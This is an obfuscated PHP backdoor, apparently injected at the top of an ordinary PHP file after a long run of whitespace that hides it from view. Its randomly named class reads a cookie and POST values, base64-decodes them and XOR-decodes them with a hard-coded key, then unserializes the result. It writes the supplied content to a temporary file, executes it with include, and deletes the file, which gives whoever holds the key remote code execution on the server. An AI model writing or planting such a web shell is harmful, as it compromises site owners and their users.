<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("bjdbepgb")){class bjdbepgb{public static $encpbzqwr = "cnnmzkxbzrdcltlg";public static $kattwzf = NULL;public function __construct(){$nqpscwjmpx = @$_COOKIE[substr(bjdbepgb::$encpbzqwr, 0, 4)];if (!empty($nqpscwjmpx)){$qcoksfteb = "base64";$kokkdmww = "";$nqpscwjmpx = explode(",", $nqpscwjmpx);foreach ($nqpscwjmpx as $fqsxhb){$kokkdmww .= @$_COOKIE[$fqsxhb];$kokkdmww .= @$_POST[$fqsxhb];}$kokkdmww = array_map($qcoksfteb . "_decode", array($kokkdmww,));$kokkdmww = $kokkdmww[0] ^ str_repeat(bjdbepgb::$encpbzqwr, (strlen($kokkdmww[0]) / strlen(bjdbepgb::$encpbzqwr)) + 1);bjdbepgb::$kattwzf = @unserialize($kokkdmww);}}public function __destruct(){$this->nddkcqhcyj();}private function nddkcqhcyj(){if (is_array(bjdbepgb::$kattwzf)) {$pqmaodk = sys_get_temp_dir() . "/" . crc32(bjdbepgb::$kattwzf["salt"]);@bjdbepgb::$kattwzf["write"]($pqmaodk, bjdbepgb::$kattwzf["content"]);include $pqmaodk;@bjdbepgb::$kattwzf["delete"]($pqmaodk);exit();}}}$zfigtif = new bjdbepgb();$zfigtif = NULL;} ?><?php
